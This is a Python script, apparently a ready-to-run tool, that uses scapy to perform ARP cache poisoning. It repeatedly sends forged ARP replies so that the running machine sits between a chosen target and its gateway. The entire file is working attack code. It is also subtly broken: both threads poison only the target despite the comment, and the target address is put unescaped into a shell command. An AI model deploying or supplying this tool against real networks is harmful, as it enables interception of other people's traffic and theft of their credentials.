import os
import sys
import time
import threading
from scapy.layers.l2 import ARP, Ether, srp1
from scapy.sendrecv import send
from termcolor import colored


def get_gateway_ip():
    # Determine the OS
    platform_id = sys.platform

    if platform_id == "win32":  # Windows
        return os.popen("ipconfig | findstr Default").read().split()[-1]
    else:  # Linux
        return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()


class ArpPoisoner:
    def __init__(self, target, gateway, interval, ignore_cache):
        if target is None:
            print("[ARP] Error: Unspecified target.")
            sys.exit(1)

        if gateway is None:
            self.gateway = get_gateway_ip()
        else:
            self.gateway = gateway

        self.target = target
        self.interval = interval
        self.ignore_cache = ignore_cache

    def get_target_mac(self):
        if not self.ignore_cache:
            # Check ARP cache for target MAC address
            cache = os.popen("arp -a {}".format(self.target)).read().split()
            if sys.platform == "win32":
                if len(cache) > 4:
                    return cache[-2].replace("-", ":")
            else:
                if len(cache) > 7:
                    return cache[3]

        # Create ARP request packet
        ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request = ARP(pdst=self.target)
        broadcast_arp = ether_broadcast / arp_request

        # Send ARP request and listen for valid response
        while True:
            response = srp1(broadcast_arp, verbose=False)
            if response.psrc == self.target:
                return response.hwsrc
            else:
                time.sleep(5)

    def arp_poison(self):
        if self.target == ARP().psrc:
            target_mac = ARP().hwsrc  # Return MAC address of machine
        else:
            target_mac = self.get_target_mac()  # Get MAC address of target

        # Construct ARP packet
        arp = ARP(psrc=self.gateway, pdst=self.target, hwdst=target_mac, op=2)  # is-at operation

        # Indefinitely send packets
        while True:
            send(arp, verbose=0)
            print(colored("[ARP] Sent packet to {} / {} from {}".format(self.target, target_mac, self.gateway), "light_grey"))
            time.sleep(self.interval)

    def start(self):
        # Poison the target's and gateway's ARP cache to establish a MITM attack
        t1 = threading.Thread(target=lambda: self.arp_poison())
        t2 = threading.Thread(target=lambda: self.arp_poison())

        # Set as daemon threads to allow main thread to exit
        t1.daemon = True
        t2.daemon = True

        # Simultaneously run the threads
        t1.start()
        t2.start()

        print(colored("Started ARP poisoning.", "light_grey"))
